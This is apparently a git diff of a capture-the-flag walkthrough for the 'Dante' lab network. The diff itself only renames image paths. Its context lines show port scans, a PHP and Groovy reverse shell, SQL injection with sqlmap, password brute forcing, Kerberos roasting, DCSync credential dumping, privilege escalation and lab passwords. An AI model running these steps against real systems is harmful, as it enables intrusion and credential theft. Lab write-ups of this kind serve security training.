@@ -210,15 +210,15 @@ scan the ports
 proxychains nmap 172.16.1.13 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the web server there is xampp. By enumerating the directories we can find /discuss
 
-<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 If you register can upload a php reverse shell and reach it throught the /ups/webshell.php
 
-<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Upload nc64.exe, invoke a reverse shell and use powerup.ps1 to find a misconfiguration
 
@@ -234,7 +234,7 @@ scan the ports
 proxychains nmap 172.16.1.12 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 Found /blog
 
@@ -244,7 +244,7 @@ SQL injection [https://www.exploit-db.com/exploits/48615](https://www.exploit-db
 sqlmap -u "http://172.16.1.12/blog/category.php?id=1*" --batch -D flag --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 with
 
@@ -265,7 +265,7 @@ we can access ftp with the ben credential and also ssh
 
 By doing `sudo -l` we can see that we can run /bin/bash as all users except root
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 but the version is vulnerable to this exploit  [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)
 
@@ -283,7 +283,7 @@ scan the ports
 proxychains nmap 172.16.1.102 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the website we can found OMRS that is vulnerable [https://www.exploit-db.com/exploits/49557](https://www.exploit-db.com/exploits/49557)
 
@@ -291,7 +291,7 @@ On the website we can found OMRS that is vulnerable [https://www.exploit-db.com/
 python3 omrs.py -u http://172.16.1.102:80/ -c 'whoami'
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Open a reverse shell and take the flag
 
@@ -305,11 +305,11 @@ scan the ports
 proxychains nmap 172.16.1.20 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vulnerable to eternalblue
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I also found a file with this credentials
 
@@ -323,7 +323,7 @@ scan the ports
 proxychains nmap 172.16.1.101 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Try to bruteforce ftp
 
@@ -335,7 +335,7 @@ This identified valid credentials. We can login to FTP using dharding : Westmins
 
 We found a file inside called "Remote login.txt"
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we need to try different password for smb and try to see
 
@@ -343,7 +343,7 @@ So we need to try different password for smb and try to see
 crackmapexec winrm 172.16.1.101 -u 'dharding' -p words.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once logging on we found out that there is IObit vulnerable (9.5) [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)
 
@@ -351,11 +351,11 @@ Once logging on we found out that there is IObit vulnerable (9.5) [https://www.e
 sc.exe qc IObitUnSvr
 ```
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 With winpeas we can also see something interesting
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So exploit it
 
@@ -382,7 +382,7 @@ run autoroute -s 172.16.2.0/24
 
 and run nmap against the new host with `scanner/portscan/tcp`
 
-<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Try to enumerate users with krebrute using the previous wordlist
 
@@ -390,7 +390,7 @@ Try to enumerate users with krebrute using the previous wordlist
 /kerbrute userenum -d dante --dc 172.16.2.5 user.txt
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 Asperoast the user to get the ticket and crack it offline
 
@@ -408,7 +408,7 @@ From bloodhound we can see that jbercov has the ability to DCSync the domain, so
 impacket-secretsdump 'dante/jbercov':myspace7@172.16.2.5
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 now we can login to the dc as administrator
 
@@ -428,11 +428,11 @@ Let's enumerate some ports
 proxychains nmap -Pn -sT -sV -T5 172.16.1.19
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the :8080 using the creds found previously we can log in on jenkins ad admin
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 on /script we can launch the following groovy reverse shell to get a foothold
 
@@ -446,11 +446,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using pspy we can found a pair of credentials for ian that we can use to su (VPN123ZXC)
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ian is part of `disk` group that can be exploited to read all files on the system
 
@@ -459,7 +459,7 @@ debugfs /dev/sda5
 cat root/flag.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## DANTE-ADMIN-NIX5
 
@@ -471,7 +471,7 @@ Let's enumerate ports
 nmap -Pn -sT -sV -T5 172.16.2.101
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's try to bruteforce SSH
 
@@ -495,7 +495,7 @@ Only ssh open with the same credentials of julian
 
 We found in the desktop a text file regarding Sophie password change in `TerrorInflictPurpleDirt996655`.
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's switch to the user plongbottom with the password found on DC01
 
@@ -513,7 +513,7 @@ scan the ports
 proxychains nmap 172.16.1.5 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Flag inside ftp with anonymous login
 
@@ -529,11 +529,11 @@ we have admin rights and can launch system commands
 exec master..xp_cmdshell 'whoami'
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 In C:\DB\_backups we found a file named db\_backups.ps1 with inside the sophie password
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 sophie:Alltheleavesarebrown1
 
@@ -545,7 +545,7 @@ evil-winrm -u 'sophie' -p 'Alltheleavesarebrown1' -i 172.16.1.5 -s Tools/CRTE/
 
 sophie has vulnerable privileges
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 use juicypotato
 
@@ -555,4 +555,4 @@ use juicypotato
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
